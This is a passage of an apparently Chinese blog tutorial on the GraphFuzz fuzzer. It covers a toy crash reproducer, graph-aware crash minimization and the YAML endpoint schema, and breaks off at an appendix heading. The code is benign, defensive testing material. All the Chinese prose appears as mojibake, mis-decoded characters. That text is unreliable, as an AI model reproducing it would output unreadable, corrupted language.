c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"lib.h"</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE(t) static_cast<span class="hljs-string">&lt;t *&gt;</span>(calloc(sizeof(t), 1))</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">GFUZZ_BUNDLE</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">void</span> *active;<br>    <span class="hljs-type">void</span> *inactive;<br>    <span class="hljs-built_in">GFUZZ_BUNDLE</span>(<span class="hljs-type">void</span> *_active, <span class="hljs-type">void</span> *_inactive): <span class="hljs-built_in">active</span>(_active), <span class="hljs-built_in">inactive</span>(_inactive) {}<br>};<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUNDLE(a,b) new GFUZZ_BUNDLE((void *)a, (void *)b)</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    Foo *var_0;<br>    { <span class="hljs-comment">// begin shim_0</span><br>        var_0 = <span class="hljs-built_in">MAKE</span>(Foo);<br>        Foo ref = <span class="hljs-built_in">Foo</span>();<br>        *var_0 = ref;<br>    } <span class="hljs-comment">// end shim_0</span><br>    Foo *var_1;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_0-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">70</span>); <span class="hljs-comment">// ascii 'F'</span><br>        var_1 = var_0;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_2;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_1-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">85</span>); <span class="hljs-comment">// ascii 'U'</span><br>        var_2 = var_1;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_3;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_2-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">90</span>); <span class="hljs-comment">// ascii 'Z'</span><br>        var_3 = var_2;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_4;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_3-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">90</span>); <span class="hljs-comment">// ascii 'Z'</span><br>        var_4 = var_3;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_5;<br>    { <span class="hljs-comment">// begin shim_3</span><br>        var_4-&gt;<span class="hljs-built_in">check</span>(); <span class="hljs-comment">// __builtin_trap</span><br>        var_5 = var_4;<br>    } <span class="hljs-comment">// end shim_3</span><br>    Foo *var_6;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_5-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">5</span>);<br>        var_6 = var_5;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_7;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_6-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">0</span>);<br>        var_7 = var_6;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_8;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_7-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">0</span>);<br>        var_8 = var_7;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_9;<br>    { <span class="hljs-comment">// begin shim_3</span><br>        var_8-&gt;<span class="hljs-built_in">check</span>();<br>        var_9 = var_8;<br>    } <span class="hljs-comment">// end shim_3</span><br>    { <span class="hljs-comment">// begin shim_1</span><br>        <span class="hljs-built_in">free</span>(var_9);<br>    } <span class="hljs-comment">// end shim_1</span><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>è¯¥crashåœ¨å†…éƒ¨ä»è¢«è¡¨ç¤ºä¸ºæ•°æ®æµå›¾ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒæ ·çš„æ¨¡ç³Šå™¨æ¦‚å¿µæ¥è¿›è¡Œå›¾æ„ŸçŸ¥çš„æœ€å°åŒ–</li></ul><blockquote><p><span class="github-emoji"><span>ğŸ““</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f4d3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ç›®å‰libFuzzerä¸æ”¯æŒè‡ªå®šä¹‰minimize_crashé€‰é¡¹ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šå°è¯•æ‰§è¡Œå­—èŠ‚æ„ŸçŸ¥çš„æœ€å°åŒ–ï¼Œå› æ­¤æä¾›äº†ä¸€ä¸ªå›¾æ„ŸçŸ¥æœ€å°åŒ–å·¥å…·ä½œä¸º<code>gfuzz</code>çš„ä¸€éƒ¨åˆ†</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Usage: gfuzz min [fuzzer] [crash]</span><br>$ gfuzz min ./fuzz_exec crash-402bbad640a94933571939f685ea1e9dc4b937f8<br></code></pre></td></tr></tbody></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/o4.png"></p><ul><li>ç„¶åæˆ‘ä»¬æŸ¥çœ‹æœ€å°åŒ–åçš„æµ‹è¯•ç”¨ä¾‹ï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./fuzz_write crash-402bbad640a94933571939f685ea1e9dc4b937f8.min<br></code></pre></td></tr></tbody></table></figure><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"lib.h"</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE(t) static_cast<span class="hljs-string">&lt;t *&gt;</span>(calloc(sizeof(t), 1))</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">GFUZZ_BUNDLE</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">void</span> *active;<br>    <span class="hljs-type">void</span> *inactive;<br>    <span class="hljs-built_in">GFUZZ_BUNDLE</span>(<span class="hljs-type">void</span> *_active, <span class="hljs-type">void</span> *_inactive): <span class="hljs-built_in">active</span>(_active), <span class="hljs-built_in">inactive</span>(_inactive) {}<br>};<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUNDLE(a,b) new GFUZZ_BUNDLE((void *)a, (void *)b)</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    Foo *var_0;<br>    { <span class="hljs-comment">// begin shim_0</span><br>        var_0 = <span class="hljs-built_in">MAKE</span>(Foo);<br>        Foo ref = <span class="hljs-built_in">Foo</span>();<br>        *var_0 = ref;<br>    } <span class="hljs-comment">// end shim_0</span><br>    Foo *var_1;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_0-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">70</span>); <span class="hljs-comment">// ascii 'F'</span><br>        var_1 = var_0;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_2;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_1-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">85</span>); <span class="hljs-comment">// ascii 'U'</span><br>        var_2 = var_1;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_3;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_2-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">90</span>); <span class="hljs-comment">// ascii 'Z'</span><br>        var_3 = var_2;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_4;<br>    { <span class="hljs-comment">// begin shim_2</span><br>        var_3-&gt;<span class="hljs-built_in">write</span>(<span class="hljs-number">90</span>); <span class="hljs-comment">// ascii 'Z'</span><br>        var_4 = var_3;<br>    } <span class="hljs-comment">// end shim_2</span><br>    Foo *var_5;<br>    { <span class="hljs-comment">// begin shim_3</span><br>        var_4-&gt;<span class="hljs-built_in">check</span>(); <span class="hljs-comment">// __builtin_trap</span><br>        var_5 = var_4;<br>    } <span class="hljs-comment">// end shim_3</span><br>    { <span class="hljs-comment">// begin shim_1</span><br>        <span class="hljs-built_in">free</span>(var_5);<br>    } <span class="hljs-comment">// end shim_1</span><br>}<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>ğŸ‘</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f44f.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>ğŸ‘</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f44f.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>ğŸ‘</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f44f.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ä¸Šè¿°ç»“æœåˆ é™¤äº†å†—ä½™çš„ä»£ç </p><h2 id="5-ç«¯ç‚¹"><a href="#5-ç«¯ç‚¹" class="headerlink" title="5. ç«¯ç‚¹"></a>5. ç«¯ç‚¹</h2><ul><li>ç«¯ç‚¹æ˜¯ä¸€ä¸ªGraphFuzz harnessåŸºæœ¬æ„å»ºå—ï¼ˆæ•°æ®æµå›¾çš„é¡¶ç‚¹ï¼‰ï¼Œæœ¬èŠ‚ä¸»è¦æ¢ç´¢å®Œæ•´çš„ç«¯ç‚¹å®šä¹‰è¯­æ³•ï¼š</li></ul><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Foo:</span><br>    <span class="hljs-string">...</span><br>    <span class="hljs-attr">methods:</span><br>    <span class="hljs-string">...</span><br>    <span class="hljs-comment"># Endpoint name.</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">myEndpoint:</span><br>        <span class="hljs-comment"># List of "live" inputs.</span><br>        <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>, <span class="hljs-string">'Bar'</span>]<br><br>        <span class="hljs-comment"># List of "live" outputs.</span><br>        <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Bar'</span>]<br><br>        <span class="hljs-comment"># Additional fuzzable parameters.</span><br>        <span class="hljs-attr">args:</span> [<span class="hljs-string">'int'</span>, <span class="hljs-string">'char[10]'</span>]<br><br>        <span class="hljs-comment"># Endpoint code. (<span class="hljs-doctag">note:</span> "exec: |" is YAML syntax for a multiline string)</span><br>        <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">            // Arbitrary C/C++ code here</span><br><span class="hljs-string">            for (int i = 0; i &lt; 10; ++i) {</span><br><span class="hljs-string">                $a1[i] &amp;= 0x7f;</span><br><span class="hljs-string">            }</span><br><span class="hljs-string">            $i1-&gt;doFunction($i0, $a0, $a1);</span><br><span class="hljs-string">            $o0 = $i1;</span><br></code></pre></td></tr></tbody></table></figure><ul><li>å¯ä»¥å°†ç«¯ç‚¹å®šä¹‰æŠ½è±¡ä¸ºä¸€ä¸ªä»£ç ç‰‡æ®µï¼Œå¯¹ç”¨æ³•æœ‰ä¸€å®šçš„è¦æ±‚ï¼š</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// [å‰ææ¡ä»¶:]</span><br><span class="hljs-comment">// $i0 is a live Foo *</span><br><span class="hljs-comment">// $i1 is a live Bar *</span><br><span class="hljs-comment">// $a0 is an int</span><br><span class="hljs-comment">// $a1 is a char[10]</span><br>{<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; ++i) {<br>        $a1[i] &amp;= <span class="hljs-number">0x7f</span>;<br>    }<br>    $i1-&gt;<span class="hljs-built_in">doFunction</span>($i0, $a0, $a1);<br>    $o0 = $i1;<br>}<br><span class="hljs-comment">// [å‰ææ¡ä»¶:]</span><br><span class="hljs-comment">// $o0 is a live Bar *</span><br></code></pre></td></tr></tbody></table></figure><p>æ³¨ï¼šä¸ºäº†è¿è¡Œæ­¤ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦åˆå§‹åŒ–å¤šä¸ªå¯¹è±¡ï¼ŒåŒ…æ‹¬å®æ—¶æ•°æ®ç±»å‹ã€‚è¿è¡Œæ­¤ä»£ç åï¼Œå°†å‰©ä¸‹ä¸€ä¸ªå¯¹è±¡ï¼ˆBar *ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦æ¸…ç†è¯¥å¯¹è±¡</p><ul><li>æ¨¡ç³Šæµ‹è¯•å¼•æ“å°†é€šè¿‡è°ƒç”¨æ„é€ å¿…è¦å¯¹è±¡å¹¶ææ„ç»“æœå¯¹è±¡çš„å…¶ä»–ç«¯ç‚¹æ¥è‡ªåŠ¨è¯†åˆ«å¦‚ä½•è°ƒç”¨æ­¤ç«¯ç‚¹</li></ul><hr><ul><li>åœ¨<a href="#basicusage">åŸºæœ¬ç”¨æ³•</a>ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹æ¨¡å¼æ¥è‡ªåŠ¨ç”Ÿæˆå®Œæ•´çš„ç«¯ç‚¹å®šä¹‰</li></ul><p><strong>schema.yamlï¼š</strong></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Foo:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">struct</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Foo</span><br>  <span class="hljs-attr">headers:</span> [<span class="hljs-string">lib.h</span>]<br>  <span class="hljs-attr">methods:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">Foo()</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">~Foo()</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">write(char</span> <span class="hljs-string">val)</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">check()</span><br></code></pre></td></tr></tbody></table></figure><ul><li>åœ¨å†…éƒ¨ï¼ŒGraphFuzzç”Ÿæˆäº†ä¸€ä¸ªå®Œæ•´çš„æ¨¡å¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</li></ul><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Foo:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">struct</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Foo</span><br>  <span class="hljs-attr">headers:</span> [<span class="hljs-string">lib.h</span>]<br>  <span class="hljs-attr">methods:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">Foo():</span><br>      <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        $o0 = new Foo();</span><br><span class="hljs-string"></span>  <span class="hljs-bullet">-</span> <span class="hljs-string">~Foo():</span><br>      <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        delete $i0;</span><br><span class="hljs-string"></span>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">write(char</span> <span class="hljs-string">val):</span><br>      <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">args:</span> [<span class="hljs-string">'char'</span>]<br>      <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        $i0-&gt;write($a0);</span><br><span class="hljs-string">        $o0 = $i0;</span><br><span class="hljs-string"></span>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">check():</span><br>      <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>      <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        $i0-&gt;check();</span><br><span class="hljs-string">        $o0 = $i0;</span><br></code></pre></td></tr></tbody></table></figure><ul><li>æ¥ä¸‹æ¥ä¸€ä¸€åˆ†æç«¯ç‚¹ï¼š</li></ul><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Foo::Foo()</strong></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">Foo():</span><br>    <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br>        <span class="hljs-string">$o0</span> <span class="hljs-string">=</span> <span class="hljs-string">new</span> <span class="hljs-string">Foo();</span><br></code></pre></td></tr></tbody></table></figure><ul><li>è¯¥ç«¯ç‚¹æ— è¾“å…¥å’Œä¸Šä¸‹æ–‡å‚æ•°ï¼ˆç›´æ¥çœç•¥è¿™äº›å­—æ®µï¼‰ã€‚å› ä¸ºè¯¥ç«¯ç‚¹æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå…¶äº§ç”Ÿä¸€ä¸ª<code>Foo</code>ç±»å‹çš„è¾“å‡ºã€‚åœ¨è¾“å‡ºä¸­ï¼Œæˆ‘ä»¬ç¼–å†™è¾“å‡ºå¯¹è±¡çš„ç±»å‹åç§°ã€‚åœ¨<code>exec</code>æ¨¡æ¿ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å®é™…è°ƒç”¨è¿™ä¸ªæ„é€ å‡½æ•°ã€‚å› ä¸ºæˆ‘ä»¬æŒ‡å®šäº†è¾“å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¿é—®æ¨¡æ¿å˜é‡**$o0**ï¼ˆç¬¬0ä¸ªè¾“å‡ºï¼‰ï¼Œè¯¥å˜é‡å°†å¡«å……ä¸ºä¸€ä¸ª<code>Foo *</code>æŒ‡é’ˆã€‚</li></ul><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Foo::~Foo()</strong></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">~Foo():</span><br>    <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br>        <span class="hljs-string">delete</span> <span class="hljs-string">$i0;</span><br></code></pre></td></tr></tbody></table></figure><ul><li>è¯¥ç«¯ç‚¹æ˜¯ä¸€ä¸ªææ„å‡½æ•°ã€‚ä¸ºäº†è°ƒç”¨ææ„å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¯¹è±¡çš„å®ä¾‹ï¼›å› æ­¤ï¼Œæˆ‘ä»¬åœ¨<code>inputs</code>æ•°ç»„ä¸­æŒ‡å®šä¸€ä¸ª<code>Foo</code>å¯¹è±¡ã€‚å› ä¸ºæˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªè¾“å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¿é—®æ¨¡æ¿å˜é‡**$i0**ï¼ˆç¬¬0ä¸ªè¾“å…¥ï¼‰ï¼Œå³ä¸€ä¸ª<code>Foo *</code>æŒ‡é’ˆã€‚</li></ul><p><span class="github-emoji"><span>3âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Foo::check()</strong></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">check():</span><br>    <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        $i0-&gt;check();</span><br><span class="hljs-string">        $o0 = $i0;</span><br></code></pre></td></tr></tbody></table></figure><ul><li>è¯¥ç«¯ç‚¹æ˜¯ä¸€ä¸ªæ–¹æ³•è°ƒç”¨ã€‚ä¸ºäº†æ‰§è¡Œä¸€ä¸ªæ–¹æ³•è°ƒç”¨ï¼Œæˆ‘ä»¬éœ€è¦è¿™ä¸ªå¯¹è±¡çš„ä¸€ä¸ªå®ä¾‹ã€‚åœ¨æˆ‘ä»¬æ‰§è¡Œè¿™ä¸ªæ–¹æ³•è°ƒç”¨ä¹‹åï¼Œè¯¥å¯¹è±¡ä»ç„¶æœ‰æ•ˆï¼Œå› æ­¤å…¶æ˜¯ä¸€ä¸ªè¾“å‡ºã€‚æˆ‘ä»¬åœ¨<code>inputs</code>å’Œ<code>outputs</code>ä¸­æŒ‡å®š<code>Foo</code>å¯¹è±¡ã€‚åœ¨æˆ‘ä»¬æ‰§è¡Œæ¨¡æ¿æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®<strong>$i0</strong>å’Œ<strong>$o0</strong>ã€‚å½“è¿™ä¸ªç«¯ç‚¹è¢«è°ƒç”¨æ—¶ï¼Œ$i0å°†æŒ‡å‘ä¸€ä¸ªæœ‰æ•ˆçš„<code>Foo</code>å¯¹è±¡å¹¶ç”±æˆ‘ä»¬è´Ÿè´£å¡«å……**$o0**</li></ul><p><span class="github-emoji"><span>4âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0034-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Foo::write(char)</strong></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">write(char</span> <span class="hljs-string">val):</span><br>    <span class="hljs-attr">inputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">outputs:</span> [<span class="hljs-string">'Foo'</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">'char'</span>]<br>    <span class="hljs-attr">exec:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        $i0-&gt;write($a0);</span><br><span class="hljs-string">        $o0 = $i0;</span><br></code></pre></td></tr></tbody></table></figure><ul><li>å’Œ<code>Foo::check()</code>ä¸€æ ·ï¼Œè¯¥ç«¯ç‚¹ä¹Ÿæ˜¯ä¸€ä¸ªæ–¹æ³•è°ƒç”¨ã€‚ä½†æ˜¯ï¼Œè¯¥æ–¹æ³•æœ‰å¦å¤–ä¸€ä¸ªå‚æ•°ï¼šä¸€ä¸ª<code>char</code>å˜é‡å°†ä¼ é€’ç»™æˆ‘ä»¬çš„ç«¯ç‚¹æ–¹æ³•ã€‚<code>char</code>æ˜¯ä¸€ä¸ªåŸºæœ¬ç±»å‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå…¶ä¸ä¼šä½œä¸ºæ•°æ®æµå›¾çš„ä¸€éƒ¨åˆ†è¿›è¡Œè·Ÿè¸ªã€‚ç›¸åï¼Œåœ¨ç»™å®šå›¾ä¸­çš„æ¯ä¸ªç«¯ç‚¹å®ä¾‹åŒ…å«ä¸€ä¸ªæ­¤å‚æ•°çš„å•ç‹¬å®ä¾‹ï¼Œè¯¥å®ä¾‹å¯ä»¥è¢«æ¨¡ç³Šæµ‹è¯•ã€‚è¿™äº›ä¸Šä¸‹æ–‡ç›¸å…³çš„å‚æ•°è¢«æŒ‡å®šåœ¨<code>args</code>æ•°ç»„ä¸­ã€‚è¿™é‡Œæˆ‘ä»¬é€šè¿‡æ¨¡æ¿å˜é‡**$a0**ï¼ˆç¬¬0ä¸ªå‚æ•°ï¼‰æ¥æŒ‡å‘<code>char</code>å˜é‡ã€‚</li></ul><h2 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h2><h3 id="A-ç›¸å…³æºä»£ç "><a href="#A-ç›¸å…³æºä»£ç " class="headerlink" title="A. 